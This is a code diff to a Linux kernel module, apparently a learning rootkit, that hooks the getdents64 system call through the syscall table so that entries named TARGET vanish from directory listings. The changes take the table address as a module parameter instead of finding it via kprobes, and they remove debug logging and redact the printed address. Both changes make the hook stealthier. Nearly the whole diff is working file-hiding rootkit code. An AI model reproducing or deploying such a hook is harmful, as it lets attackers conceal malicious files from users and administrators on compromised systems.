@@ -2,7 +2,6 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/moduleparam.h>
-#include <linux/kprobes.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("LavaTime");
@@ -18,22 +17,19 @@ struct linux_dirent64 {
 	char d_name[];
 };
 
-static struct kprobe kp = {
-	.symbol_name = "kallsyms_lookup_name"
-};
-
+static unsigned long sym_addr = 0;
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 static void**sys_call_table;
-typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
+
+module_param(sym_addr, ulong, 0644);
 
 
 static asmlinkage long hacked_getdents64(const struct pt_regs *regs)
 {
-	printk(KERN_INFO "Syscall_hooker: jumped to hacked syscall");
-	return -EPERM;
 	int fd __attribute__((unused))= (int)regs->di; // Marked as unused, only for learning
 	struct linux_dirent64 *dirp = (struct linux_dirent64*)regs->si;
 	int count __attribute__((unused)) = regs->dx; // Marked as unused, only for learning
+
 	long ret = orig_getdents64(regs);
 	if (ret <= 0)
 	{
@@ -55,14 +51,13 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *regs)
 			kfree(kdirent);
 			return ret;
 		}
-		printk(KERN_INFO "Syscall_hooker: About to enter while");
+
 		while (offset < ret)
 		{
 			current_dir = (struct linux_dirent64 *)((char*)kdirent + offset);
-			printk(KERN_INFO "Syscall_hooker: Looking at entry %s", current_dir->d_name);
+
 			if (!strcmp(current_dir->d_name, TARGET))
 			{
-				printk(KERN_INFO "Syscall_hooker: Hit a match!");
 				memmove(current_dir, (struct linux_dirent64 *)((void*)current_dir + current_dir->d_reclen), (ret - (current_dir->d_reclen + offset)));
 				ret -= current_dir->d_reclen;
 			}
@@ -83,27 +78,12 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *regs)
 
 static int __init syscall_hooking_init(void)
 {
-	register_kprobe(&kp);
-	kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
-	unregister_kprobe(&kp);
-
-	unsigned long sys_call_close = (unsigned long)kallsyms_lookup_name("sys_close");
-	sys_call_table = (void **)kallsyms_lookup_name("sys_call_table");
-	unsigned long int offset = (unsigned long int) sys_call_table;
-	unsigned long **sct;
-	while (offset < ((unsigned long)sys_call_table + 0x2000))
+	if (sym_addr == 0)
 	{
-		sct = (unsigned long **)offset;
-
-		if (sct[__NR_close] == (unsigned long *)sys_call_close)
-		{
-			sys_call_table = (void **)sct;
-			break;
-		}
-		offset += sizeof(void *);
+		printk(KERN_WARNING "Syscall_hooker: Didn't receive a sys_call_table location!\n");
+		return -1;
 	}
-	printk(KERN_INFO "The first thing at the sys_call_table is: %lx", sys_call_table[0]);
-	printk(KERN_INFO "Syscall_hooker: Target before hooking. Address: %lx\n", sys_call_table[__NR_getdents64]);
+	sys_call_table = (void **)sym_addr;
 	orig_getdents64 = (asmlinkage long (*)(const struct pt_regs *))sys_call_table[__NR_getdents64];
 	unsigned int __attribute__((unused)) level;
 	pte_t *getdents64_pointer_pte;
@@ -118,7 +98,7 @@ static int __init syscall_hooking_init(void)
 	
 	
 	
-	printk(KERN_INFO "Syscall_hooker: Target acquired. Address: %lx\n", sys_call_table[__NR_getdents64]);
+	printk(KERN_INFO "Syscall_hooker: Target acquired. Address: <REDACTED>\n");
 	
 	return 0;
 }
